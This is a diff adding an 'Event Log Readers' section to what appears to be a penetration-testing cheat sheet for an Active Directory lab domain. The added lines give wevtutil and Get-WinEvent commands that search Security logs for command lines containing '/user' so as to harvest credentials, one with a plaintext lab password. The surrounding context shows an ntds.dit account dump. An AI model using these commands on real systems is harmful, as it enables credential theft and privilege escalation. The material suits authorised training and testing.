@@ -74,6 +74,13 @@ $key = Get-BootKey -SystemHivePath .\SYSTEM
 Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
 ```
 
+## Event Log Readers
+```
+wevtutil qe Security /rd:true /f:text | Select-String "/user"
+wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
+Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+```
+
 # Roles
 ## GenericAll
 Creating a Fake SPN
